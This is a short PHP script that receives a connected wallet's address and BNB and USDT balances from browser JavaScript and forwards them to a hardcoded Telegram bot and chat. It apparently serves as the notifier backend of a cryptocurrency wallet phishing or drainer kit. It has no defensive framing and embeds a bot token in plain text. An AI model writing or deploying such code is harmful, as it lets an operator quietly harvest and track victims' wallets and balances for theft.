<?php
// Get JSON data sent from your JavaScript
$data = json_decode(file_get_contents("php://input"), true);

// Fallback values to avoid errors
$address = isset($data['address']) ? $data['address'] : 'Not Found';
$bnb = isset($data['bnb']) ? $data['bnb'] : '0';
$usdt = isset($data['usdt']) ? $data['usdt'] : '0';

// Your Telegram bot token and chat ID
$token = '7536567492:AAHTGbJZXi2g7N_qY-AnpTBMZ6jHFYM42eM';
$chat_id = '8191508290';

// Prepare the message
$message = "📥 *Wallet Connected!*\n\n"
         . "👛 *Address:* `$address`\n"
         . "💰 *BNB:* $bnb\n"
         . "💸 *USDT:* $usdt";

// Send Telegram message using file_get_contents
file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($message) . "&parse_mode=Markdown");
?>
